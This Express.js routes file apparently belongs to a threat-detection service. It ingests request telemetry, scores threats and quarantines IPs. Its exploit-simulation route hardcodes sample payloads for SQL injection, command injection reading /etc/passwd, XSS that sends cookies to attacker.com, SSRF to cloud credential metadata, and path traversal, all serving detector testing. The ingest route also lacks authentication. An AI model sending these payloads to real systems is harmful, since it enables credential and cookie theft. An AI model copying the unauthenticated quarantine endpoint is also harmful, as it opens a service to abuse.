import express from 'express';
import { db } from '../config/db.js';
import { analyzeThreat } from '../services/threatAnalyzer.js';
import { IngestTelemetrySchema } from '../validators/security.validator.js';
import { authenticateToken } from '../middleware/authMiddleware.js';

const router = express.Router();

// POST /api/v1/telemetry/ingest
router.post('/ingest', async (req, res) => {
  try {
    const startTime = Date.now();
    const validated = IngestTelemetrySchema.parse(req.body);

    // Analyze threat
    const analysis = await analyzeThreat({
      ip: validated.ip_address,
      method: validated.method,
      endpoint: validated.endpoint,
      headers: validated.headers,
      payload: validated.payload
    });

    const settings = await db.getSettings();
    const threshold = settings?.sensitivityThreshold ?? 0.75;

    // Insert Telemetry Log
    const record = await db.insertTelemetry({
      ip_address: validated.ip_address,
      method: validated.method,
      endpoint: validated.endpoint,
      headers: validated.headers,
      payload: validated.payload,
      is_threat: analysis.isThreat,
      threat_category: analysis.threatCategory,
      confidence_score: analysis.confidenceScore,
      risk_level: analysis.riskLevel,
      technicalExplanation: analysis.technicalExplanation,
      suggestedMitigation: analysis.suggestedMitigation
    });

    let autoIsolated = false;
    if (analysis.isThreat && analysis.confidenceScore >= threshold) {
      autoIsolated = true;
      await db.addQuarantine({
        ip_address: validated.ip_address,
        reason: `Automated telemetry isolation: ${analysis.technicalExplanation}`,
        threat_category: analysis.threatCategory
      });

      await db.insertVulnerability({
        telemetry_id: record.id,
        title: `${analysis.threatCategory} exploit detected on ${validated.endpoint}`,
        owasp_category: analysis.threatCategory,
        file_path: 'server/src/routes/demoExploits.routes.js',
        vulnerable_code: `// Express Endpoint Handler\nrouter.${validated.method.toLowerCase()}('${validated.endpoint}', async (req, res) => {\n  // Injected payload:\n  const payload = ${JSON.stringify(validated.payload)};\n});`,
        severity: analysis.riskLevel
      });
    }

    const latencyMs = Date.now() - startTime;

    return res.status(200).json({
      success: true,
      latencyMs,
      telemetryId: record.id,
      analysis: {
        isThreat: analysis.isThreat,
        threatCategory: analysis.threatCategory,
        confidenceScore: analysis.confidenceScore,
        riskLevel: analysis.riskLevel,
        autoIsolated,
        technicalExplanation: analysis.technicalExplanation,
        suggestedMitigation: analysis.suggestedMitigation
      }
    });
  } catch (err) {
    if (err.name === 'ZodError') {
      return res.status(400).json({ error: err.errors[0]?.message || 'Validation error' });
    }
    return res.status(500).json({ error: 'Telemetry ingestion failed: ' + err.message });
  }
});

// GET /api/v1/telemetry/logs
router.get('/logs', authenticateToken, async (req, res) => {
  try {
    const limit = parseInt(req.query.limit || '50', 10);
    const offset = parseInt(req.query.offset || '0', 10);
    const riskLevel = req.query.riskLevel || 'ALL';
    const threatCategory = req.query.threatCategory || 'ALL';

    const data = await db.getTelemetryLogs({ limit, offset, riskLevel, threatCategory });
    return res.status(200).json(data);
  } catch (err) {
    return res.status(500).json({ error: 'Failed to retrieve telemetry logs: ' + err.message });
  }
});

// GET /api/v1/telemetry/stats
router.get('/stats', authenticateToken, async (req, res) => {
  try {
    const stats = await db.getTelemetryStats();
    return res.status(200).json(stats);
  } catch (err) {
    return res.status(500).json({ error: 'Failed to retrieve telemetry statistics: ' + err.message });
  }
});

// POST /api/v1/telemetry/simulate-exploit
router.post('/simulate-exploit', authenticateToken, async (req, res) => {
  try {
    const { attackType = 'SQL_INJECTION' } = req.body;
    let payload = {};
    let endpoint = '/api/v1/demo/vulnerable-user';
    let method = 'POST';
    let ip = `198.51.${Math.floor(Math.random() * 250) + 1}.${Math.floor(Math.random() * 250) + 1}`;

    switch (attackType) {
      case 'SQL_INJECTION':
        payload = { username: "admin' UNION SELECT username, password_hash FROM users --", password: "x" };
        break;
      case 'COMMAND_INJECTION':
        endpoint = '/api/v1/demo/vulnerable-cmd';
        payload = { hostname: "localhost; cat /etc/passwd" };
        break;
      case 'XSS':
        payload = { comment: "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>" };
        break;
      case 'SSRF':
        payload = { targetUrl: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" };
        break;
      case 'IDOR':
        endpoint = '/api/v1/demo/vulnerable-user?id=../../etc/passwd';
        method = 'GET';
        payload = { id: '../../etc/passwd' };
        break;
      default:
        payload = { query: "' OR 1=1 --" };
    }

    const analysis = await analyzeThreat({ ip, method, endpoint, headers: { 'user-agent': 'AegisMind Exploit Simulator v1.0' }, payload });
    const record = await db.insertTelemetry({
      ip_address: ip,
      method,
      endpoint,
      headers: { 'user-agent': 'AegisMind Exploit Simulator v1.0' },
      payload,
      is_threat: analysis.isThreat,
      threat_category: analysis.threatCategory,
      confidence_score: analysis.confidenceScore,
      risk_level: analysis.riskLevel,
      technicalExplanation: analysis.technicalExplanation,
      suggestedMitigation: analysis.suggestedMitigation
    });

    if (analysis.isThreat) {
      await db.addQuarantine({
        ip_address: ip,
        reason: `Simulated exploit trigger: ${analysis.technicalExplanation}`,
        threat_category: analysis.threatCategory
      });

      await db.insertVulnerability({
        telemetry_id: record.id,
        title: `Simulated ${analysis.threatCategory} exploit on ${endpoint}`,
        owasp_category: analysis.threatCategory,
        file_path: 'server/src/routes/demoExploits.routes.js',
        vulnerable_code: `// Demo Vulnerable Endpoint\nrouter.${method.toLowerCase()}('${endpoint}', async (req, res) => {\n  const payload = ${JSON.stringify(payload)};\n});`,
        severity: analysis.riskLevel
      });
    }

    return res.status(200).json({
      success: true,
      simulatedIp: ip,
      analysis,
      telemetryRecord: record
    });
  } catch (err) {
    return res.status(500).json({ error: 'Exploit simulation error: ' + err.message });
  }
});

export default router;
